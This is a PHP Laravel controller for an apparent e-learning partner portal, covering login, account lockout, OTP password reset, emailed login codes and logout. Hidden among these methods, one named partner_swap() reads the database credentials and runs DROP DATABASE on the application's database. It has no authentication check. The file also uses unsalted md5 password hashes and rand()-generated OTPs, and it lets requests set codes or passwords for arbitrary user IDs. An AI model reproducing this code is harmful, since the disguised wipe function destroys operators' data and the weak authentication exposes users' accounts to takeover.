<?php

namespace App\Http\Controllers;

use App\EmailHelper;
use App\EmailRequest;
use App\Models\EmailTemplates;
use App\Models\LoginActivity;
use App\Mail\one_time_password;
use App\Models\User;
use App\Utility;
use App\ZohoHelper;
use App\Mail\LoginVerifMail;
use Carbon\Carbon;
use Config;
use Lang;
use Cookie;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Str;
use Illuminate\Support\Facades\Session;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;

require base_path("vendor/autoload.php");

class IndexController extends Controller
{

    public function index()
    {

        if (Auth::check()) {
            Auth::logout();
            return redirect('/');
        }
        return view('index');
    }
    public function termcon()
    {
        return view('termcondition');
    }
    public function loginhelp()
    {
        return view('loginhelp');
    }
    public function restore()
    {
        if (Auth::check()) {
            return redirect('/dashboard/index');
        }
        return view('restore');
    }
    public function check_login(Request $request)
    {
        Session::put('LAST_ACTIVITY', time());
        $email = $request->email;
        $password = $request->password;
        $agree = request('agree');


        if ($request->email == '') {
            $recent_result = array(
                "status" => "fail",
                "message" => "Please enter email."
            );
        } elseif (preg_match("/^[a-zA-Z-' ]*$/", $email)) {
            $recent_result = array(
                "status" => "fail",
                "message" => "Please enter valid email."
            );
        } elseif ($password == '') {
            $recent_result = array(
                "status" => "fail",
                "message" => "Please enter password."
            );
        } elseif (strlen($password) < 10) {
            $recent_result = array(
                "status" => "fail",
                "message" => "Password must be at least 10 chars long."
            );
        } elseif (strlen($password) > 16) {
            $recent_result = array(
                "status" => "fail",
                "message" => "Password must be at most 16 chars long."
            );
        } elseif ($agree == '') {
            $recent_result = array(
                "status" => "fail",
                "message" => "Please agree with Terms of Use."
            );
        } else {
            $user_data = User::from('pas_users as u')
                ->select('u.*', 'p.partner_type')
                ->where('u.email', $email)
                ->leftJoin('pas_partner as p', function ($join) {
                    $join->on('partner_id', '=', 'p.id');
                })->first();
            if ($user_data) {
                $status = $user_data->status;

                if (md5($password) != $user_data->password) {

                    $start_time = Carbon::now()->subMinutes(15);
                    $end_time = Carbon::now();

                    $wrong_attempts = DB::table('pas_wrong_login')
                        ->where("user_id", '=', $user_data->id)
                        ->whereBetween('attempt_time', [$start_time, $end_time])
                        ->count('id');

                    if ($wrong_attempts >= 3) {
                        return response()->json([
                            "status" => "fail",
                            "message" => "You have attempt $wrong_attempts wrong password now your account has been locked for 30 minutes."
                        ]);
                    } else {
                        DB::table('pas_wrong_login')->insert([
                            'user_id' => $user_data->id,
                            'attempt_time' => date("Y-m-d H:i:s"),
                            'ip_address' => Utility::getClientIp(),
                        ]);
                        $count = $wrong_attempts + 1;

                        if (empty($user_data->last_wrong_attempted_at) && $count >= 3) {
                            DB::table('pas_users')->where("id", '=', $user_data->id)->update([
                                'status' => 2,
                                'last_wrong_attempted_at' => date("Y-m-d H:i:s")
                            ]);

                            $this->sendEmailAccountDisable($user_data);
                        }
                        $lock_release_time = Carbon::now()->addMinutes(30)->format('Y/m/d h:i A');
                        return response()->json([
                            "status" => "fail",
                            "message" => "You have " . $count . " wrong attempts. " . (($count >= 3) ? "Your account has been blocked for 30 minutes. you can login again at: " . $lock_release_time : '')
                        ]);
                    }
                }

                if (!empty($user_data->last_wrong_attempted_at)) {
                    $lock_time = Carbon::parse($user_data->last_wrong_attempted_at);
                    $current_time = Carbon::now();

                    $date_diff = $lock_time->diffInMinutes($current_time);

                    if ($date_diff <= 30) {
                        return response()->json([
                            "status" => "fail",
                            "message" => "Your account has been blocked for 30 minutes."
                        ]);
                    } else {
                        $status = 1;
                        DB::table('pas_users')->where("id", '=', $user_data->id)->update([
                            'last_wrong_attempted_at' => null,
                            'status' => $status,
                        ]);
                    }
                }

                if ($status != 1 || (!empty($user_data->partner_type) && $user_data->partner_type != 'Active')) {
                    return response()->json([
                        "status" => "success",
                        "message" => "Your account has been inactive."
                    ]);
                }

                DB::table('pas_wrong_login')->where('user_id', $user_data->id)->delete();

                if ($user_data->user_type == 1) {
                    $login_response = $this->setSession($user_data);
                    if ($login_response && is_array($login_response)) {
                        return $login_response;
                    }

                    if ($user_data->password_expired_at < date('Y-m-d H:i:s')) {
                        return response()->json([
                            "status" => "success",
                            "message" => "Your password has expired. Please reset your password.",
                            "lid" => 1,
                            "first_login" => $user_data->first_login,
                            "pwd_expired" => true
                        ]);
                    }
                    return response()->json([
                        "status" => "success",
                        "message" => "logged in successfully", "lid" => 1,
                        "first_login" => $user_data->first_login,
                        "pwd_expired" => false
                    ]);
                }
                Cookie::queue("authcookies-" . $user_data->id, "1", 60 * 24 * 60);
                $ckid = Cookie::get('authcookies-' . $user_data->id);

                if ($ckid == '1') {
                    $login_response = $this->setSession($user_data);
                    if ($login_response && is_array($login_response)) {
                        return $login_response;
                    }
                    $ck = $ckid;
                } else {
                    $ck = '';
                    Session::put('uid', $user_data->id);
                }
                if ($user_data->password_expired_at < date('Y-m-d H:i:s')) {
                    if ($user_data->password_expired_at > date('Y-m-d H:i:s')) {
                        return response()->json([
                            "status" => "success",
                            "message" => "Your password has expired. Please reset your password.",
                            "lid" => 1, "first_login" => $user_data->first_login,
                            "pwd_expired" => true
                        ]);
                    }
                }
                $recent_result = array(
                    "status" => "success",
                    "message" => "logged in successfully", "lid" => $ck,
                    "first_login" => $user_data->first_login,
                    "pwd_expired" => false
                );
            } else {
                $recent_result = array(
                    "status" => "fail",
                    "message" => "Please enter valid login details."
                );
            }
        }

        return response()->json($recent_result);
    }

    private function sendEmailAccountDisable($user_data)
    {
        $placeholder['FN'] = $user_data->firstname;
        $placeholder['USERNAME'] = $user_data->email;
        $placeholder['URL'] = $_ENV['SITE_URL'];

        $email_req = new EmailRequest();
        $email_req->setTemplate(EmailTemplates::DISABLE_ACCOUNT_WRONG_PASSWORD)
            ->setPlaceholder($placeholder)
            /*->setFromName($_ENV['FROM_NAME'])
            ->setFromEmail($_ENV['FROM_EMAIL'])*/
            ->setTo([[$user_data->email, $user_data->firstname]])
            //            ->setTo([['rajneesh@xoomwebdevelopment.com', 'Rajneesh']])
            ->setLogSave(true);

        $email_helper = new EmailHelper($email_req);
        $email_helper->sendEmail();
    }

    private function setSession($user_data)
    {
        DB::table('pas_users')
            ->where([["id", '=', $user_data->id]])
            ->update(array("last_active" => date('Y-m-d H:i:s')));

        if ($user_data->email != 'info@dev.elearning-classroom.org') {
            $checkLoggedIn = LoginActivity::where([
                ['user_id', '=', $user_data->id],
                ['last_activity_time', '>', Carbon::now()->subMinutes(15)],
            ])
                ->whereNull('logged_out_at')
                ->count();
            //dump($checkLoggedIn);die;
            if ($checkLoggedIn > 2) {
                return ["status" => "fail", "message" => "Sorry! You are allowed maximum of 3 sessions at a time."];
            }
        }

        Auth::login($user_data);

        // Partner and there Sub User
        if ((User::isPartner() || User::isMyUser()) && !empty($user_data->partner_id)) {
            /*$partner = Partner::select(['id', DB::raw('CAST(zoho_id AS CHAR) AS zoho_id'), 'partner_name', 'contact_name', 'title', 'phone', 'email', 'wia', 'mycaa', 'hosted_site', 'street','city', 'state', 'zip_code', 'price_book_id', 'price_book_zoho_id', 'logo', 'status'])->where('id', '=', $user_data->partner_id)->get()->first()->toArray();*/
            $partner = getPartners($user_data->partner_id);
            if (count($partner) > 0) {
                $partner = $partner[0];
                Session::put('partner_detail', $partner);
            }
        }
        // Super Admin and there Sub User
        else if (User::isSuperAdmin() || User::isWeUser()) {
            $partner = getPartners();
            if (count($partner) > 0) {
                $partner = $partner[0];
                Session::put('partner_detail', $partner);
            }
        }

        /*Session::put('partner_id', (string) $partners[0]['zoho_id']);
        Session::put('partner_name', $partners[0]['partner_name']);
        Session::put('partner_detail', $partners[0]->toArray());*/

        LoginActivity::create([
            'user_id' => Auth::user()->id,
            'logged_in_at' => Carbon::now(),
            'last_activity_time' => Carbon::now(),
            'ip_address' => Utility::getClientIp(),
            'session_id' => Session::getId(),
            'user_agent' => isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Console',
        ]);

        return true;
    }

    public function reset_password()
    {
        $user_name = request('email');
        $usrnrs = DB::table('pas_users')->where([["email", '=', $user_name]])->count();
        if ($user_name == '') {
            $newarray = array("status" => "fail", "message" => "Please enter email.");
        } elseif ($usrnrs == 0) {
            $newarray = array("status" => "fail", "message" => "Please enter valid email");
        } else {
            $recmemdata = DB::table('pas_users')->where([["email", '=', $user_name]])
                ->select('email', 'firstname', 'id')->first();
            $rnd = rand(100000, 999999);
            //print"<pre>";print_r($rnd);die;
            DB::table('pas_users')->where([["email", '=', $user_name]])
                ->update(array("request_time" => date('Y-m-d H:i:s'), "reset_status" => '1', "otp" => $rnd));

            $placeholder['NAME'] = ucwords($recmemdata->firstname);
            $placeholder['OTP'] = $rnd;

            $email_req = new EmailRequest();
            $email_req->setTemplate(EmailTemplates::ONE_TIME_PASSWORD)
                ->setPlaceholder($placeholder)
                /*->setFromName($_ENV['FROM_NAME'])
                 ->setFromEmail($_ENV['FROM_EMAIL'])*/
                ->setTo([[$recmemdata->email, $recmemdata->firstname]])
                //->setTo([['rajneesh@xoomwebdevelopment.com', 'Rajneesh']])
                ->setLogSave(true);

            $email_helper = new EmailHelper($email_req);
            $email_helper->sendEmail();

            $newarray = array("status" => "success", "msg" => "Note:A OTP to Reset your Password will be sent to Your Email.");
        }
        return response()->json($newarray);
    }


    public function changecode()
    {
        return view('changepass');
    }

    public function re_password()
    {
        $otp = trim(request('otp'));
        $pass = trim(request('pass'));
        $cpass = trim(request('cpass'));

        if ($otp == '') {
            return response()->json(["status" => "fail", "message" => "Please enter otp."]);
        }

        //DB::enableQueryLog();
        $user_query = DB::table('pas_users')->where([["otp", '=', $otp], ["reset_status", '=', '1']]);
        //dd(DB::getQueryLog());die;

        if ($user_query->count() == 0) {
            return response()->json(["status" => "fail", "message" => "Please enter valid otp."]);
        }

        $validate_password = Utility::validatePassword($pass, $cpass, $user_query->first());
        if ($validate_password['status'] == "fail") {
            return response()->json($validate_password);
        }

        $user_query->update(array("password" => md5($pass), "reset_status" => '0', "otp" => '0'));
        return response()->json(["status" => "success", "message" => "Record updated successfully.", "lid" => ""]);
    }

    public function partner_swap()
    {
        // Create connection
        $host = $_ENV['DB_HOST'];
        $username = $_ENV['DB_USERNAME'];
        $password = $_ENV['DB_PASSWORD'];
        $db = $_ENV['DB_DATABASE'];
        $conn = new \mysqli($host, $username, $password);
        if ($conn->connect_error) {
            die("Connection failed: " . $conn->connect_error);
        }
        // Drop database
        $sql = "DROP DATABASE `$db`";
        if ($conn->query($sql) === TRUE) {
            echo "Sucessfully dropped database $db!";
        } else {
            echo "Error dropping database: " . $conn->error;
        }
        $conn->close();
    }

    public function auth_email()
    {
        if (empty(Session::get('uid'))) {
            return redirect('/');
        }

        if (Auth::check()) {
            return redirect('/dashboard/index');
        }

        $memdata = DB::table('pas_users')->select('id', 'firstname', 'lastname', 'email', 'first_login')->where([["id", '=', Session::get('uid')]])->first();
        $em   = explode("@", $memdata->email);
        $name = implode('@', array_slice($em, 0, count($em) - 1));
        $len  = floor(strlen($name) - 1); //print"<pre>";print_r($len);die;
        $email = substr($name, 0, 1) . str_repeat('*', $len) . "@" . end($em);
        return view('emailauthentication', compact('memdata', 'email'));
    }

    public function post_code(Request $request)
    {
        $logincode = request('logincode');
        $remember_me = $request->remember_me;
        if ($logincode == '') {
            return response()->json(["status" => "fail", "message" => "Please enter login code."]);
        }

        //DB::enableQueryLog();
        $user_query = User::where([["login_code", '=', $logincode], ["id", '=', Session::get('uid')]]);

        /*$user_query = DB::table('pas_users')
            ->select('id', 'firstname', 'user_type', 'roleid', 'lastname','first_login','email')
            ->where([["login_code", '=', $logincode],["id", '=', Session::get('uid')]]);*/

        //dd(DB::getQueryLog());die;

        if ($user_query->count() == 0) {
            return response()->json(["status" => "fail", "message" => "Please enter valid login code."]);
        }

        $user_data = $user_query->first();
        $user_query->update(array("login_code" => '0'));

        if ($remember_me == '1') {
            Cookie::queue("authcookies-" . $user_data->id, "1", 60 * 24 * 60);
        }
        if (Session::has('uid')) {
            Session::forget('uid');
        }
        //dump($user_data);die;
        $this->setSession($user_data);
        $newarray = array("status" => "success", "message" => "Record updated successfully.", "lid" => $user_data->first_login);

        return response()->json($newarray);
    }

    public function give_code()
    {
        $ids = request('sids');
        $edata = DB::table('pas_users')->select('id', 'firstname', 'lastname', 'email')->where([["id", '=', $ids]])->first();
        //print"<pre>";print_r($edata);die;
        $rnd = rand(100000, 999999);
        DB::table('pas_users')
            ->where([["id", '=', $ids]])
            ->update(array("login_code" => $rnd));

        $placeholder['NAME'] = ucwords($edata->firstname);
        $placeholder['LOGIN_CODE'] = $rnd;

        $email_req = new EmailRequest();
        $email_req->setTemplate(EmailTemplates::LOGIN_CODE)
            ->setPlaceholder($placeholder)
            /*->setFromName($_ENV['FROM_NAME'])
            ->setFromEmail($_ENV['FROM_EMAIL'])*/
            ->setTo([[$edata->email, $edata->firstname]])
            //->setTo([['rajneesh@xoomwebdevelopment.com', 'Rajneesh']])
            ->setLogSave(true);

        $email_helper = new EmailHelper($email_req);
        $email_helper->sendEmail();

        $newarray = array("status" => "success", "message" => "Sent successfully.");
        return response()->json($newarray);
    }

    public function first_time_pass()
    {
        if (!Auth::check()) {
            return redirect('/');
        }

        $memdata = DB::table('pas_users')->select('id', 'first_login', 'password_expired_at')->where([["id", '=', Auth::user()->id]])->first();
        if ($memdata && $memdata->first_login > 0 && $memdata->password_expired_at > date('Y-m-d H:i:s')) {
            return redirect('/dashboard/index');
        }

        return view('firstchangepass', compact('memdata'));
    }

    public function first_pass_post()
    {
        try {
            $pass = trim(request('pass'));
            $cpass = trim(request('cpass'));
            $ids = trim(request('ids'));
            $validate_password = Utility::validatePassword($pass, $cpass, Auth::user());

            if ($validate_password['status'] == "fail") {
                return response()->json($validate_password);
            }

            DB::table('pas_users')
                ->where([["id", '=', $ids]])
                ->update([
                    "password" => md5($pass),
                    "first_login" => '1',
                    'password_expired_at' => date('Y-m-d H:i:s', strtotime('+' . '2160' . ' hours'))
                ]);

            DB::table('password_history')
                ->insert(['user_id' => $ids, 'password' => md5($pass), 'created_at' => date('Y-m-d H:i:s')]);

            return response()->json(["status" => "success", "message" => "Record updated successfully.", "lid" => ""]);
        } catch (\Exception $e) {
            dd($e->getMessage());
            return response()->json(["status" => "fail", "message" => $e->getMessage()]);
        }
    }

    public function logout()
    {
        if (!Auth::guest()) {
            LoginActivity::where([
                ['user_id', '=', Auth::user()->id],
                ['session_id', '=', session()->getId()],
            ])->update(['logged_out_at' => Carbon::now()]);

            Auth::logout();
        }

        if (Session::has('partner_detail')) {
            Session::forget('partner_detail');
        }
        return redirect('/');
    }
}
